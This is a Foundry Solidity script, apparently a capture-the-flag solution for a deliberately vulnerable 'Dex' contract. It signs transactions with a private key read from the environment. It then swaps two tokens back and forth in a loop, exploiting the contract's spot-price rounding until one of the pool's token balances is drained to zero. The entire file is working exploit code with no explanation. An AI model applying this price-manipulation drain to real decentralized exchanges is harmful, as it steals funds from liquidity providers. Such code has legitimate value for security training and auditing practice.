// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { Dex } from "../src/Dex.sol";


contract DexSolver is Script {
	
	Dex public instance = Dex(0x41CE51620da472D575f765F6b5AC96d7Ca7c3f5f);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

    function min(uint256 a, uint256 b) public returns (uint256) {
        return a > b ? b : a;
    }

	function run () external {

		vm.startBroadcast(prv);

        address t1 = instance.token1();
        address t2 = instance.token2();

        instance.approve(address(instance), 1000);

        console.log("||||||  logging  |||||||");
        console.logBytes32(bytes32(instance.balanceOf(t1, address(instance))));
        console.logBytes32(bytes32(instance.balanceOf(t2, address(instance))));
        console.logBytes32(bytes32(instance.balanceOf(t1, me)));
        console.logBytes32(bytes32(instance.balanceOf(t2, me)));
        console.logBytes32(bytes32(instance.getSwapPrice(t1, t2, 1)));
        console.logBytes32(bytes32(instance.getSwapPrice(t2, t1, 1)));

        uint256 b1 = instance.balanceOf(t1, address(instance));
        uint256 b2 = instance.balanceOf(t2, address(instance));

        for (uint256 i = 0; i < 50; i++) {

            address tmp = t1;
            t1 = t2;
            t2 = tmp;
            console.log("||||||  logging  |||||||");
            console.log("swapping -- >");
            instance.swap(t1, t2, 
                min(
                    instance.balanceOf(t1, me),
                    instance.balanceOf(t1, address(instance))
                )
            );
            
            console.logBytes32(bytes32(instance.balanceOf(t1, address(instance))));
            console.logBytes32(bytes32(instance.balanceOf(t2, address(instance))));
            console.logBytes32(bytes32(instance.balanceOf(t1, me)));
            console.logBytes32(bytes32(instance.balanceOf(t2, me)));
            // console.logBytes32(bytes32(instance.getSwapPrice(t1, t2, 1)));
            // console.logBytes32(bytes32(instance.getSwapPrice(t2, t1, 1)));

            if (instance.balanceOf(t1, address(instance)) == 0)
                break;
            if (instance.balanceOf(t2, address(instance)) == 0)
                break;
        }


		vm.stopBroadcast();


	}

}
